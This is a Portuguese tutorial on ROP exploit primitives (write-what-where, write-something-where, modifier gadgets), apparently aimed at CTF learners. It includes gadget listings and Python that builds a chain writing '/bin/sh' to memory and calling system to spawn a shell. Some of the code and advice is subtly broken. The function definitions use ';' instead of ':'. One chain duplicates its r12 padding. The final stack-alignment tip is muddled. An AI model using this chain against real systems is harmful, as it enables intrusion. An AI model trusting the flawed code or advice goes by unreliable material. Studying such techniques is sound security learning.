- [Primitivos](#primitivos)
- [Classificação](#classificação)
  - [Write - What - Where](#write---what---where)
    - [Exemplo](#exemplo)
  - [Write - Something - Where](#write---something---where)
  - [Modificador](#modificador)
- [Incomuns](#incomuns)
- [Dicas](#dicas)
  - [Valores pre modificados](#valores-pre-modificados)
  - [Alinhamento da stack](#alinhamento-da-stack)

# Primitivos
Primitivos sao a base dos exploits modernos, um primitivo pode ser desde uma 
sequencia especifica de gadgets, funções, etcetc.

Normalmente, voce vai adicionar funções aos seus scripts que usem o primitivo, 
acelerando a velocidade de desenvolvimento dos exploits.

# Classificação
## Write - What - Where
Esse primitivo te permite escrever algo (what) em algum lugar, esse algo pode 
ser desde 1 byte, ate uma qword inteira!

### Exemplo
Uma chain que escreve um byte em um local:
```x86asm
gadget_pop_rdi:
    pop rdi
    ret

gadget_pop_rax:
    pop r13
    pop rax
    pop r12
    xor r13 r12
    ret

gadget_mov_rdi_al:
    mov [rdi] al
    pop r14
    ret
```

Gadgets normalmente nao sao exatamente o que a gente precisa, então as vezes 
precisamos ocupar a stack com "lixinho" para compensar!

Sim... esse e o nome técnico correto! E nao tem argumento que me va me 
convencer do contrario!

```py
def write_byte(what, where);
    temp = b""                  # Lixo  # Util
    temp += gadget_pop_rdi      
    temp += p64(where)                  # rdi
    temp += gadget_pop_rax      
    temp += b"A"*8              # r13
    temp += p64(what)                   # rax
    temp += b"B"*8              # r12
    temp += gadget_mov_rdi_al           # mov [rdi] al
    temp += b"C"*8              # r14
    
    return temp
```

E nos poderíamos usar assim:
```py
payload = b'A'*40
data_seg = 0x00601028
for c in b"/bin/sh\x00":
	payload += write_byte(c, data_seg)
	data_seg += 1

payload += gadget_pop_rdi
payload += p64(0x00601028)    # data_seg inicial: pointer para /bin/sh
payload += p64(libc.sym.system) 
```

## Write - Something - Where

Voce escreve alguma coisa (voce nao controla) em algum lugar (voce controla)

o `mov [rdi] al` poderia ser substituído por:
`mov [rdi] 0x7f 1e 1f 60 00 00 00 00`

Assim, podemos escrever esse valor fixo, em um endereço que nos controlamos!

Pode util ser em ROP chains caso voce possua um modificador.

Uma fonte comum desse primitivo sao unlinks parciais no heap (unsorted bins attack)

## Modificador 
add, xor, sub, .... todas essas instruções nos permitem alterar os bytes que 
ja estão na memoria!

E similar aos writes, a quantidade de controle que possuímos pode variar!

`pop rdx; add [rdx] 0x02;` Somente controlamos o endereço!

Caso tenhamos um `xor`, a situação ideal seria a memoria = `0xff`

Caso seja um `add`, e a memoria `0x00`, nos possuímos um write super simples!

E assim por diante!

# Incomuns
Existem outros primitivos que sao mais raros, então somente irei explicar 
quando for util. Por exemplo o `write refletido`: explicado no 
tutorial de unsafe unlink!

Porem vou colocar os links aqui caso voce esteja procurando por algum especifico! :D

# Dicas 
## Valores pre modificados

Similar ao lixinho para os `pops`, e eu nao sabia aonde colocar! hehe :D

As vezes, um gadget muito util acaba tendo efeito colateral nos nossos valores!

Por exemplo, vamos supor que somente exista um gadget que nos permita alterar rdi!

```x86asm
gadget_rdi:
    pop rdi
    add rdi 0x1234 
    ret

gadget_pop_rax:
    pop r13
    pop rax
    pop r12
    xor r13 r12
    ret

gadget_mov_rdi_al:
    mov [rdi] al
    pop r14
    ret
```
Os outros gadgets estão inalterados!
```py
def write_byte(what, where);
    temp = b""                  # Lixo  # Util
    temp += gadget_pop_rdi


    temp += p64(where - 0x1234)         # rdi
    
    
    temp += gadget_pop_rax      
    temp += b"A"*8              # r13
    temp += p64(what)                   # rax
    temp += b"B"*8              # r12

    temp += b"B"*8              # r12
    temp += gadget_mov_rdi_al           # mov [rdi] al
    temp += b"C"*8              # r14
    
    return temp
```

## Alinhamento da stack

Voce precisa garantir o alinhamento da stack de acordo com a arquitetura:
- x86 -> 4 bytes -> p32()
- x86_64 -> 8 bytes -> p64()

Mesmo que o valor seja so um byte, voce precisa garantir o alinhamento da 
stack! Pois o `pop` vai retirar 4 ou 8 bytes independentemente! Assim, 
estragando o endereço do proximo gadget na chain!

Caso o bytes va para `al`, `p64(0x41) `ja basta!

Mas caso o valor para `al` voce precisa fazer `p64(0x4100)` ou `b"\x00"*7 + b"\x41" + b"\x00"`